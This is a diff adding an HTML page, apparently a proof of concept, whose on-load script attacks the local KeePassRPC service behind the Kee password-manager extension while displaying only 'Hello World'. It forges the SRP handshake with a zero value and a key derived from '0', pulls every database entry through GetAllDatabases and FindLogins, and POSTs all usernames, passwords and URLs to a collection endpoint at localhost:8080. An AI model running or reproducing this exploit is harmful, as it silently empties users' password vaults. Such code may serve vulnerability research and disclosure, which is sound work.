@@ -1,0 +1,349 @@
+<html>
+<head>
+    <script src="{{ url_for('static', filename='forge-sha256.js') }}"></script>
+    <script>
+        const generateIv = () => {
+            return window.crypto.getRandomValues(new Uint8Array(16))
+        }
+
+        const getKey = async () => {
+            const key = await crypto.subtle.importKey(
+                "raw",
+                rawKey,
+                {name: "AES-CBC", length: 256},
+                true,
+                ["encrypt", "decrypt"]);
+            return key;
+        }
+
+        const encrypt = async (data, key) => {
+            const encoded = new TextEncoder().encode(data);
+            const iv = generateIv();
+            const cipher = await window.crypto.subtle.encrypt({
+                name: 'AES-CBC',
+                iv
+            }, key, encoded);
+            return {cipher, iv}
+        }
+
+        const decrypt = async (ciphertext, iv, key) => {
+            const decrypted = await window.crypto.subtle.decrypt(
+                {name:"AES-CBC",
+                    iv},
+                key,
+                ciphertext
+            );
+            return decrypted;
+        }
+
+        const sha1 = async (data) => {
+            if (typeof data == "string") {
+                bytes = new TextEncoder().encode(data);
+            } else {
+                bytes = data;
+            }
+            hash = await window.crypto.subtle.digest({name: "SHA-1"}, bytes)
+            return hash;
+        }
+
+
+
+        const fromHexString = hexString =>
+            new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+
+
+        const toHexString = bytes =>
+            bytes.reduce((str, byte) => str + byte.toString(16).padStart(2, '0'), '');
+
+
+        var webSocket = new WebSocket("ws://localhost:12546");
+        var hexKey = forge_sha256("0");
+        var rawKey = fromHexString(hexKey);
+        var lastRequest = "";
+        var ids = [];
+        var accounts = {"accounts":[]};
+        var accountsFound = 0;
+        webSocket.onopen = function (event) {
+        }
+        webSocket.onmessage = function (event) {
+            const msg = JSON.parse(event.data);
+
+            // SRP
+            if (msg.protocol == "setup") {
+                if (msg.srp.hasOwnProperty("B")) {
+                    SRP2(msg.srp.B);
+                }
+                if (msg.srp.hasOwnProperty("M2")) {
+                    sendGetDB();
+                }
+            }
+
+            // RPC
+            if (msg.protocol == "jsonrpc") {
+                var iv = base64toByteArray(msg.jsonrpc.iv);
+                var ciphertext = base64toByteArray(msg.jsonrpc.message);
+                getKey().then( key => {
+                    decrypt(ciphertext, iv, key).then(raw => {
+                        var plaintext = new TextDecoder().decode(raw);
+                      //  console.log(plaintext);
+                        if(lastRequest == "sendGetDB") {
+                            findIds(plaintext);
+                            for(var i =0; i< ids.length; i++) {
+                                sendGetPW(ids[i])
+                                accountsFound++;
+                            }
+                        }
+                        if(lastRequest == "sendGetPW") {
+                            getAccount(plaintext);
+                            if(accountsFound == 0) {
+                                console.log(JSON.stringify(accounts));
+                                sendAccounts();
+                            }
+                            accountsFound--;
+                        }
+
+                    })
+                })
+
+            }
+
+
+        }
+
+        function sendAccounts() {
+            const xHttp = new XMLHttpRequest();
+            const url ='http://localhost:8080/sendAccounts';
+            xHttp.open("POST",url);
+            xHttp.send(JSON.stringify(accounts));
+        }
+
+        function sendGetDB() {
+            var call = '{' +
+                '"jsonrpc":"2.0",' +
+                '"params":null,' +
+                '"method":"GetAllDatabases",' +
+                '"id":0 }'
+            lastRequest = "sendGetDB";
+            sendEncrypted(call);
+        }
+
+        function sendGetPW(uuid) {
+            var call = '{' +
+                '"jsonrpc":"2.0",' +
+                '"params":[null,null,null,null,false,"'+uuid+'",null,null,null],' +
+                '"method":"FindLogins",' +
+                '"id":1 }'
+            lastRequest = "sendGetPW";
+            sendEncrypted(call)
+        }
+
+        function sendEncrypted(msg) {
+            getKey().then(key => {
+                encrypt(msg, key).then(value => {
+                    sha1(rawKey).then(outBuffer => {
+                        var keyHash = outBuffer;
+                        const hmacData = new Uint8Array(20 + value.cipher.byteLength + 16);
+                        hmacData.set(new Uint8Array(keyHash));
+                        hmacData.set(new Uint8Array(value.cipher), 20);
+                        hmacData.set(value.iv, value.cipher.byteLength + 20);
+                        sha1(hmacData).then(outBuffer => {
+                            var hmac = byteArrayToBase64(outBuffer);
+                            var iv = byteArrayToBase64(value.iv);
+                            var msg = byteArrayToBase64(value.cipher)
+                            var call = '{' +
+                                '"protocol": "jsonrpc",' +
+                                '"srp": null,' +
+                                '"key":null,' +
+                                '"error":null,' +
+                                '"jsonrpc": {' +
+                                '"message":"' + msg + '",' +
+                                '"iv":"' + iv + '",' +
+                                '"hmac":"' + hmac + '"' +
+                                '},' +
+                                '"version": 131072' +
+                                '}'
+                          //  console.log("out: " + call)
+                            webSocket.send(call)
+                        })
+                    });
+                })
+            })
+        }
+
+        function SRP2(B) {
+
+            var sha = forge_sha256("0" + B + "0");
+            var secondMsgToServer = '{' +
+                '"protocol": "setup",' +
+                '"srp": {' +
+                '"stage": "proofToServer",' +
+                '"M": "' + sha + '",' +
+                '"securityLevel": 2' +
+                '},' +
+                '"version": 131072,' +
+                '}'
+            webSocket.send(secondMsgToServer);
+        }
+
+        function SRP1() {
+            var firstMsgToServer = '{' +
+                '"protocol": "setup",' +
+                '"srp": {' +
+                '"stage": "identifyToServer",' +
+                '"I": "'+create_UUID()+'",' +
+                '"A": "0",' +
+                '"securityLevel": 2' +
+                '},' +
+                '"key": null,' +
+                '"version": 131072,' +
+                '"features": ["KPRPC_FEATURE_VERSION_1_6","KPRPC_FEATURE_WARN_USER_WHEN_FEATURE_MISSING","KPRPC_FEATURE_BROWSER_HOSTED","BROWSER_SETTINGS_SYNC"],' +
+                '"clientTypeId": "keefox",' +
+                '"clientDisplayName": "Kee",' +
+                ' "clientDisplayDescription":"my Description"' +
+                '}'
+            webSocket.onopen = function (event) {
+             //   console.log("out: " + firstMsgToServer)
+                webSocket.send(firstMsgToServer)
+            }
+        }
+
+        function getAccount(str) {
+            var json = JSON.parse(str);
+            var result = json.result;
+            for ( var i = 0; i < result.length; i++) {
+                var root = result[i];
+                if (root.hasOwnProperty("formFieldList")) {
+                    var userName = root.formFieldList[1].value;
+                    var password = root.formFieldList[0].value;
+                    var url = root.uRLs[0];
+                    var title = root.title;
+
+                    var account = {
+                        "username": userName,
+                        "password": password,
+                        "url": url,
+                        "title": title
+                    }
+                    accounts["accounts"].push(account)
+                }
+            }
+        }
+
+        function findIds(str) {
+            var json = JSON.parse(str);
+            var result = json.result;
+            for (var i = 0; i < result.length; i++) {
+                var root = result[i].root;
+                getChildGroups(root)
+            }
+        }
+
+
+        function getChildGroups(json) {
+            if(json.hasOwnProperty("childLightEntries")) {
+                for(var j = 0; j < json.childLightEntries.length; j++) {
+                    var entry = json.childLightEntries[j];
+                    ids.push(entry.uniqueID);
+                    console.log("id found: " + entry.uniqueID);
+                }
+            }
+            if(json.hasOwnProperty("childGroups")) {
+                for (var j = 0; j < json.childGroups.length; j++) {
+                    getChildGroups(json.childGroups[j]);
+                }
+            }
+        }
+
+        function hexStringToByteArray(hexString, byteArray = null) {
+            if (hexString.length % 2 !== 0) {
+                throw Error("Must have an even number of hex digits to convert to bytes");
+            }
+            const numBytes = hexString.length / 2;
+            if (!byteArray) byteArray = new Uint8Array(numBytes);
+            for (let i = 0; i < numBytes; i++) {
+                byteArray[i] = parseInt(hexString.substr(i * 2, 2), 16);
+            }
+            return byteArray;
+        }
+
+        function base64toByteArray(input) {
+            const binary = atob(input);
+            const len = binary.length;
+            const buffer = new ArrayBuffer(len);
+            const view = new Uint8Array(buffer);
+            for (let i = 0; i < len; i++) {
+                view[i] = binary.charCodeAt(i);
+            }
+            return view;
+        }
+
+        function byteArrayToBase64(arrayBuffer) {
+            let base64 = "";
+            const encodings = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+            const bytes = new Uint8Array(arrayBuffer);
+            const byteLength = bytes.byteLength;
+            const byteRemainder = byteLength % 3;
+            const mainLength = byteLength - byteRemainder;
+            let a;
+            let b;
+            let c;
+            let d;
+            let chunk;
+
+            // Main loop deals with bytes in chunks of 3
+            for (let i = 0; i < mainLength; i = i + 3) {
+                // Combine into a single integer
+                chunk = (bytes[i] << 16) | (bytes[i + 1] << 8) | bytes[i + 2];
+
+                // Use bitmasks to extract 6-bit segments from the triplet
+                a = (chunk & 16515072) >> 18; // 16515072 = (2^6 - 1) << 18
+                b = (chunk & 258048) >> 12; // 258048 = (2^6 - 1) << 12
+                c = (chunk & 4032) >> 6; // 4032 = (2^6 - 1) << 6
+                d = chunk & 63; // 63 = 2^6 - 1
+
+                // Convert the raw binary segments to the appropriate ASCII encoding
+                base64 += encodings[a] + encodings[b] + encodings[c] + encodings[d];
+            }
+
+            // Deal with the remaining bytes and padding
+            if (byteRemainder == 1) {
+                chunk = bytes[mainLength];
+
+                a = (chunk & 252) >> 2; // 252 = (2^6 - 1) << 2
+
+                // Set the 4 least significant bits to zero
+                b = (chunk & 3) << 4; // 3 = 2^2 - 1
+
+                base64 += encodings[a] + encodings[b] + "==";
+            } else if (byteRemainder == 2) {
+                chunk = (bytes[mainLength] << 8) | bytes[mainLength + 1];
+
+                a = (chunk & 64512) >> 10; // 64512 = (2^6 - 1) << 10
+                b = (chunk & 1008) >> 4; // 1008  = (2^6 - 1) << 4
+
+                // Set the 2 least significant bits to zero
+                c = (chunk & 15) << 2; // 15 = 2^4 - 1
+
+                base64 += encodings[a] + encodings[b] + encodings[c] + "=";
+            }
+
+            return base64;
+        }
+
+        function create_UUID(){
+            var dt = new Date().getTime();
+            var uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                var r = (dt + Math.random()*16)%16 | 0;
+                dt = Math.floor(dt/16);
+                return (c=='x' ? r :(r&0x3|0x8)).toString(16);
+            });
+            return uuid;
+        }
+
+    </script>
+</head>
+<body onload="SRP1()">
+<div id="one">Hello World</div>
+<div id="two"></div>
+</body>
+</html>
